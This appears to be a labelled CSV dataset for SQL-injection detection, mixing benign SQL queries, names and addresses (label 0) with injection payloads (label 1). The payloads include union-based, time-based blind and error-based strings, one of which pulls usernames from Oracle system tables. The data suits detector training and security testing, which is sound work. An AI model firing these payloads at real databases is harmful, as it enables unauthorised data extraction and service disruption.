Query,Label
SELECT * FROM Customers ORDER BY CustomerName;,0
07077546d,0
1   )    )    as ctqr where 2609  =  2609,1
"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'bwrb' like 'bwrb",1
econmicamente,0
c/ doctores lasso simarro 30,0
SELECT COUNT ( sillyID ) FROM tide,0
"1  )   and make_set  (  4593  =  7765,7765  )   and   (  8517  =  8517",1
"  SELECT FIND_IN_SET ( ""a"", ""s,q,l"" ) ;",0
clica,0
" select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",1
yaiti,0
SELECT * FROM be WHERE yourself BETWEEN forest09/01/1996clearly AND similar15/31/1996think,0
nab,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'vfxg' like 'vfxg",1
SELECT AVG ( blank ) FROM thread,0
SELECT * FROM jack WHERE view LIKE '%knowledge%',0
"1""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""oohx"" like ""oohx",1
bolvir,0
leocricia,0
SELECT lay ( s ) FROM question INNER JOIN,0
"SELECT * FROM labor WHERE noted BETWEEN ""fresh"" AND    ""count""",0
"1'  )   as wpom where 2620  =  2620 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
tipton9,0
1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1
quintino,0
"-9751""   )    )     )   or 5929  =  3884--",1
SELECT * FROM tobacco WHERE cookies = 'measure'  AND City = 'butter',0
SELECT * FROM language FETCH FIRST 3 ROWS ONLY,0
"INSERT INTO onto ( bite, slope, refer, duck, draw, rock )  VALUES  ( 'fight', 'needs'. motion', 'else', 'tribe', 'bark', 'another' )  ",0
"1' where 4039  =  4039 union all select null,null,null,null,null,null,null,null--",1
"-3834'   )    )     )   union all select 8313,8313--",1
SELECT * FROM value WHERE floating IN  ( SELECT has FROM country ) ,0
sanou bellsol,0
leobaldo,0
14230,0
"  SELECT powder AS rate, automobile AS [men]  FROM chose",0
SELECT AVG ( opposite )  FROM strike  SELECT SUM ( excitement ) ,0
"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""qkds"" like ""qkds",1
"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
5ictoriosamente,0
"1""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""fpkm"" like ""fpkm",1
4077,0
87,0
"1""  )   where 6072  =  6072 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
45908,0
"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
SELECT AVG ( mighty ) FROM company,0
 UPDATE above SET try = 'stand'WHERE silly = 'society',0
SELECT COUNT ( DISTINCT guess )  FROM stiff,0
SELECT COUNT ( aheadID ) FROM prove,0
"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'vcph'  =  'vcph",1
4830,0
gili-malave@bierstuetze.ac,0
"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",1
SELECT COUNT ( incomeID ) FROM introduced,0
SELECT tip FROM leather UNION SELECT evening FROM task ORDER BY coat,0
"  SELECT tried,accurate,stared FROM fellow LEFT JOIN Orders ON lose.happenID =  broke.list ORDER BY tribe.husband",0
ballista@kpincentives.sa,0
"torms, els",0
SELECT TOP 3 * FROM lie WHERE manner = 'happy' SELECT * FROM get,0
SELECT AVG ( Price ) FROM potatoes,0
" SELECT * FROM soldier ORDER BY government ASC, chamber DESC",0
SELECT COUNT ( cloud ) FROM child,0
"   SELECT Employees.mistake, COUNT ( Orders.worseID )  AS oughtFROM    ( OrdersINNER JOIN storm ON Orders.diameterID  =  Employees.bothID ) ",0
"calle hemingway, s/n",0
SELECT jump ( s )  FROM passage LEFT JOIN,0
"calle valencia de don juan 161, 7?d",0
"-9171  )   union all select 6880,6880,6880,6880,6880,6880,6880#",1
rodolfo,0
SELECT * FROM father WHERE situation LIKE '%belong%',0
SELECT * FROM strength ORDER BY difference,0
"  SELECT MICROSECOND ( ""23:59:59.000045"" ) ;",0
-3185'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'rknd' like 'rknd,1
SELECT * FROM judge WHERE rain = 'power'  OR pull = 'month',0
perih1lio,0
"1""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""ngnd"" like ""ngnd",1
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367658 ) ,0
-7663'   )    )    or 1558  =  1104 and    (    (   'wsrq'  =  'wsrq,1
SELECT * FROM mysterious WHERE silver BETWEEN part09/01/1996water AND build15/31/1996once,0
"-5652%'  )   union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",1
SELECT * FROM worry WHERE engine BETWEEN 'struggle' AND 'activity',0
"minguez, 98",0
66750565b,0
paucides,0
pesado,0
remante,0
select   (  case when   (  9030  =  9185  )   then 9030 else 9030*  (  select 9030 from information_schema.character_sets  )   end  )  #,1
f8av2,0
"1%""   )    )    union all select null,null,null,null,null,null,null#",1
SELECT COUNT ( flame ) FROM cause,0
"-5052   )    )     )   union all select 8351,8351,8351,8351#",1
1   )    )    and sleep  (  5  )  #,1
SELECT AVG ( cool ) FROM sick,0
-2981   )    )    or   (  8459  =  8459  )  *4906 and    (    (   4202  =  4202,1
"1'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
46942381w,0
SELECT * FROM soldier WHERE tide  BETWEEN 10 AND 20,0
19115,0
almonacid de la sierra,0
7.28868E+15,0
SELECT TOP 3 * FROM trip SELECT * FROM oil 3SELECT * FROM environment,0
SELECT * FROM give WHERE for = 'fighting'  OR mountain = 'whom',0
SELECT * FROM team WHERE tax BETWEEN '1996-07-01' AND '1996-07-31',0
"1%'   )    )     )   union all select null,null,null#",1
charpini_daillie@inmobiliariahangar.ly,0
"1""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1""  )   and 2006  =  2006",1
conejo mota,0
"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",1
SELECT AVG ( root ) FROM fully SELECT SUM ( spread ) ,0
end and   (  9416  =  9416,1
SELECT COUNT ( mailID ) FROM shore,0
SELECT * FROM fierce WHERE valley NOT LIKE '[can]%',0
"   SELECT Employees.machine, COUNT ( Orders.grewID )  AS parallelFROM    ( OrdersINNER JOIN those ON Orders.showID  =  Employees.propertyID ) ",0
"-1573""  )   union all select 3928,3928,3928,3928--",1
" select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1
yuncos,0
SELECT * FROM ourselves WHERE sad = 'select' LIMIT 3,0
1998,0
-9217 or 9323  =  9323#,1
SELECT * FROM something WHERE stock = 'let'  AND  ( take = 'hearing' OR engine = 'ants' ) ,0
SELECT chemical ( s )  FROM coat UNION,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%""  =  """,1
olea de boedo,0
SELECT apple ( s )  FROM settlers SELECT north ( s ) ,0
viena@redesmilitantes.pg,0
porter,0
4.13841E+15,0
"   SELECT COUNT ( follow ) , grain FROM us BY pain",0
SELECT * FROM bad 3,0
DELETE FROM win,0
anatoly,0
 or username like '%,1
morn de almazn,0
SELECT * FROM shout WHERE talk NOT BETWEEN 'importance' AND 'grade',0
"-5581%'   )    )     )   union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",1
mayworth@sms24h.tr,0
SELECT COUNT ( explore ) FROM having,0
"1""  )   as cnrh where 8524  =  8524 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
ehrenfri,0
3.59196E+15,0
"  UPDATE won SET known =  'prepare', City =  'far' WHERE dust =  terrible",0
5on39taci19,0
"-8888%'  )   union all select 5312,5312,5312,5312,5312,5312,5312,5312--",1
"1   )    )    as hpxw where 1826  =  1826 union all select null,null,null,null,null,null,null,null#",1
SELECT dish ( s )  FROM jet,0
"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",1
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep",1
SELECT * FROM sudden FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM soldier,0
aristteles,0
"  SELECT * FROM stand WHERE still NOT IN  ( 'gain', 'happy', 'balance' )  ",0
1%' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',1
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'zaes'  =  'zaes,1
a' or 'a'   =   'a,1
SELECT * FROM wp_posts WHERE ID  =  292420 LIMIT 1,0
"c/ torre, 23",0
8arrascal485,0
9423,0
1'||  (  select 'pcps' from dual where 7255  =  7255 and 7121  =  4603,1
"  SELECT QUARTER ( ""2017-06-15"" ) ;",0
SELECT wait FROM such,0
SELECT * FROM behavior WHERE oxygen = 'saw' FETCH FIRST 3 ROWS ONLY,0
"c/ cervera 164, 1e",0
"1  )   where 9213  =  9213 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT DISTINCT claws FROM gentle,0
SELECT advice FROM heart UNION ALL SELECT rhyme FROM room ORDER BY felt,0
SELECT * FROM active WHERE thing BETWEEN sail09/01/1996careful AND birthday15/31/1996examine,0
"-2951"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",1
"1""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#",1
SELECT * FROM flame WHERE progress = 'push'  AND  ( turn = 'perfect' OR bound = 'seven' ) ,0
97,0
9.57099E+14,0
SELECT * FROM men FETCH FIRST 50 PERCENT ROWS ONLY,0
6.81924E+15,0
SELECT * FROM cause  WHERE not = single,0
-5880'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rwgl'  =  'rwgl,1
SELECT * FROM hill WHERE mother = 'firm'  AND City = 'ate',0
6.79504E+13,0
SELECT TOP 3 * FROM bread WHERE automobile = 'building' SELECT * FROM sport,0
SELECT * FROM however WHERE wealth IN  ( SELECT repeat FROM engine ) ,0
SELECT lunch ( s )  FROM date LEFT JOIN,0
santa eullia de ronana,0
DELETE FROM extra WHERE log = 'population',0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11510 )  ORDER BY meta_id ASC",0
 UPDATE lower SET uncle = 'engineer'WHERE earn = 'sunlight',0
"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""fdvc"" like ""fdvc",1
-7552 or 6872  =  6872,1
7395,0
"1""   )    )    rlike   (  select   (  case when   (  8179  =  1246  )   then 1 else 0x28 end   )    )    and    (    (   ""xxeu""  =  ""xxeu",1
SELECT * FROM personal WHERE sink = 'nation',0
SELECT * FROM depth WHERE mountain = 'women' FETCH FIRST 3 ROWS ONLY,0
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,1
"plaa del mercat, 198 7-c",0
"1%""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,1
"SELECT DATE_SUB ( ""2017-06-15 09:34:21"", INTERVAL 15 MINUTE ) ;",0
"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa",1
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'stqq'  =  'stqq",1
"  SELECT waste AS her, like AS [popular]  FROM shore",0
SELECT COUNT ( sumID ) FROM entire,0
"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",1
SELECT AVG ( begun ) FROM low,0
"1""  )   as xaye where 5343  =  5343 and 4355  =  7475#",1
540,0
select pg_sleep  (  5  )   and    (    (     (  'qslr'  =  'qslr,1
SELECT cook FROM lot,0
calle carlos arniches 173,0
SELECT AVG ( Price ) FROM respect,0
SELECT COUNT ( usually )  FROM slabs,0
"1' in boolean mode  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT * FROM lamp WHERE contrast BETWEEN camp09/01/1996blue AND per15/31/1996paragraph,0
"  SELECT MAKEDATE ( 2017, 366 ) ;",0
nhat,0
 UPDATE adult SET honor = 'gain'WHERE chicken = 'paragraph',0
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'hhbh'  =  'hhbh",1
17489,0
SELECT * FROM class WHERE make  BETWEEN 10 AND 20,0
48710,0
1  )   and 3659  =  5475 and   (  8949  =  8949,1
SELECT TOP 3 * FROM rapidly SELECT * FROM practical 3SELECT * FROM during,0
SELECT COUNT ( cage ) FROM football,0
"   SELECT 'Customer' AS Type, ContactName, City, CountryFROM Customers  UNIONSELECT 'Supplier', ContactName, City, Country",0
1' where 6533  =  6533,1
mastelero,0
1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,1
"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw",1
SELECT * FROM sheet WHERE NOT third = 'mean'  AND NOT sort = 'likely',0
1'   )    )    as qqvk where 1007  =  1007,1
"1'+  (  select 'aphz' where 1933  =  1933 union all select null,null,null,null,null,null#",1
"1"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
end and    (    (     (  'ycte'  =  'ycte,1
"  SELECT * FROM across WHERE desk NOT IN  ( 'window', 'laid', 'eat' )  ",0
"  SELECT personalID AS ID, tape AS couple FROM happy",0
a6ordab07,0
SELECT * FROM  ( SELECT service FROM bet ) ,0
SELECT * FROM front ORDER BY pattern DESC,0
"1%'   )    )    union all select null,null--",1
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'nfix'  =  'nfix,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'vjdk' like 'vjdk",1
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1
enrique,0
SELECT AVG ( changing ) FROM smoke SELECT SUM ( enough ) ,0
"san benito, 182,",0
1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,1
SELECT * FROM yourself WHERE favorite NOT LIKE '[farmer]%',0
"  SELECT chief AS half, sitting AS [bound]  FROM average",0
1'   )    )    as dago where 9788  =  9788,1
select   (  case when   (  1291  =  6612  )   then 1 else 1291*  (  select 1291 from master..sysdatabases  )   end  )  --,1
SELECT * FROM major WHERE city LIKE '%hour%',0
9654,0
-5569'  )   as cjaf where 3753  =  3753 union all select 3753#,1
p4rtapaz,0
"regimiento, 114,",0
SELECT * FROM memory,0
SELECT * FROM appearance WHERE away = 'beyond'  AND City = 'saddle',0
doce de novembro 165,0
SELECT * FROM tune WHERE capital BETWEEN 'guess' AND 'purple',0
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1
" union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",1
SELECT * FROM compare WHERE period  BETWEEN 10 AND 20,0
"calle tiberiades, 90, 8-f",0
SELECT AVG ( earn ) FROM goose SELECT SUM ( stick ) ,0
desacertadamente,0
SELECT MIN ( entirely )  AS factory FROM straight,0
" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1
SELECT naturally FROM found,0
SELECT DEGREES ( 1.5 ) ;,0
"1' where 9222  =  9222 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
mike-osbourne@hiperzaragoza.qa,0
24596413y,0
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'ffzv'  =  'ffzv",1
SELECT TOP 3 * FROM buried SELECT * FROM waste 3SELECT * FROM railroad,0
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1
1'||  (  select 'czos' from dual where 6814  =  6814,1
73502486y,0
"-9978"" or make_set  (  4893  =  9765,9765  )   and ""mhjt""  =  ""mhjt",1
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'ljhc'  =  'ljhc,1
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'snoa'  =  'snoa,1
-3566%' or 2158  =  6289,1
"  SELECT thinkID AS ID, dry AS him FROM finally",0
8578,0
SELECT * FROM express,0
sal37a,0
SELECT desert ( s )  FROM molecular SELECT hour ( s ) ,0
"-9587 union all select 1568,1568,1568,1568,1568,1568#",1
barrenechea sadurn,0
"  SELECT skin,brass,smaller FROM dug LEFT JOIN Orders ON coast.neverID =  adjective.stronger ORDER BY chicken.two",0
halford,0
"   SELECT check, whistle+ ', ' + useful+ ' ' + mission+ ', ' + swimming AS ordinary  FROM family",0
gavald,0
"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
oskorep,0
FROM  ( SELECT DISTINCT uncle FROM nervous ) ,0
SELECT * FROM recognize  WHERE sure NOT LIKE '[court]%',0
1'||  (  select 'homm' where 4937  =  4937 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
-3846%' or 6872  =  6872 and '%'  =  ',1
4973,0
"select * from generate_series  (  9964,9964,case when   (  9964  =  4455  )   then 1 else 0 end  )   limit 1--",1
SELECT * FROM lunch ORDER BY policeman DESC,0
SELECT COUNT ( regular ) FROM clean,0
select sleep  (  5  )   and    (    (   'srfc' like 'srfc,1
1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1""  )   union all select null--",1
"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
SELECT COUNT ( represent )  FROM purple,0
SELECT shadow FROM ring UNION ALL SELECT shells FROM foreign ORDER BY night,0
rosalia,0
SELECT * FROM native WHERE wooden = 'bit'  AND  ( wrapped = 'conversation' OR dream = 'shoulder' ) ,0
"1%'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
6.25525E+15,0
"   SELECT COUNT ( night ) , recall FROM society BY obtain",0
SELECT * FROM sun WHERE that = 'window' LIMIT 3,0
SELECT cotton ( s )  FROM column FULL OUTER JOIN,0
"  SELECT ISNULL ( """" ) ;",0
ozselcuk,0
tramaced,0
"1"" where 4445  =  4445 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
"1%""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,1
59760678p,0
-9143  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
38182378d,0
SELECT sugar FROM imagine UNION ALL SELECT pull FROM composition ORDER BY die,0
"1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#",1
SELECT * FROM Products WHERE Price NOT BETWEEN 10 AND 20;,0
SELECT * FROM anywhere ORDER BY cage DESC,0
"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#",1
"-8026 or elt  (  8434  =  4516,4516  )  # bsqo",1
select   (  case when   (  8716  =  1338  )   then 1 else 8716*  (  select 8716 from master..sysdatabases  )   end  )  --,1
||'6,1
; or '1'  =  '1',1
SELECT   SPACE ( 10 ) ;,0
requena de campos,0
SELECT AVG ( certain ) FROM globe,0
"  SELECT moreID AS ID, studied AS social FROM movement",0
"  SELECT introduced,pure FROM teacher WHERE describe = 'century' UNION SELECT roll, seat FROM possible",0
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1
SELECT hall FROM means UNION ALL SELECT connected FROM chart ORDER BY similar,0
"calle profeta, 96, 2?c",0
"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'tzbp'  =  'tzbp",1
2308,0
1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'trzi'  =  'trzi,1
werling,0
"-7485%'   )    )     )   union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",1
castelln de la plana/castell de la plana,0
"-4571' union all select 3227,3227,3227,3227--",1
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",1
ezequas,0
SELECT Count ( * )  AS definition,0
64446970g,0
SELECT COUNT ( wantID ) FROM yesterday,0
"-9087"" order by 1#",1
"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1'||  (  select 'gopc' where 7386  =  7386 and make_set  (  9375  =  7963,7963   )    )   ||'",1
"1   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   3626  =  3626",1
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'brhc' like 'brhc,1
1'||  (  select 'bezt' where 7876  =  7876,1
SELECT member ( s )  FROM mood SELECT clothing ( s ) ,0
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
SELECT MIN ( right )  AS wool FROM if,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28543 )  ORDER BY meta_id ASC",0
1  )   as fxfe where 1148  =  1148 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
22618043g,0
"   SELECT rhyme, fort+ ', ' + weigh+ ' ' + engineer+ ', ' + mad AS town  FROM honor",0
SELECT column_name FROM table_name WHERE ROWNUM < =  number ;,0
"  SELECT SUBSTR ( ""SQL Tutorial"", -5, 5 )  AS ExtractString;",0
SELECT COUNT ( news ) FROM lamp,0
17151,0
llovet,0
kindermann@lawn.je,0
basile@europop.by,0
SELECT book ( s )  FROM religious UNION,0
SELECT TOP 3 * FROM mighty,0
SELECT * FROM  ( SELECT fresh FROM left ) ,0
SELECT TOP 3 * FROM sent SELECT * FROM evening 3SELECT * FROM cloud,0
1' where 7176  =  7176,1
"1""  )   as lipa where 3450  =  3450 and make_set  (  8403  =  8403,8899  )  --",1
" SELECT * FROM afraid ORDER BY wonderful ASC, leaf DESC",0
SELECT * FROM Customers WHERE  ( CustomerName LIKE 'L%' OR CustomerName LIKE 'R%' /*OR CustomerName LIKE 'S%' OR CustomerName LIKE 'T%'*/ OR CustomerName LIKE 'W%' )  AND Country = 'USA' ORDER BY CustomerName;,0
inistola,0
"   SELECT COUNT ( CustomerID ) , CountryFROM CustomersGROUP BY Country;",0
"1""  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
corcoll duhalde,0
49718,0
modorrillo,0
"INSERT INTO depth ( class, stuck, particles, sister, type, bell )  VALUES  ( 'swam', 'sick'. whatever', 'pleasant', 'foot', 'yesterday', 'wrong' )  ",0
84638109h,0
2esco63enti2,0
"gimnasia 153, 4?e",0
-6086'   )    )    or   (  6719  =  7280  )  *7280 and    (    (   'ozbj'  =  'ozbj,1
SELECT * FROM biggest WHERE NOT gift = 'audience'  AND NOT my = 'angry',0
select   (  case when   (  8820  =  4648  )   then 8820 else 8820*  (  select 8820 from information_schema.character_sets  )   end  )  #,1
SELECT * FROM studied FETCH FIRST 50 PERCENT ROWS ONLY,0
rains8,0
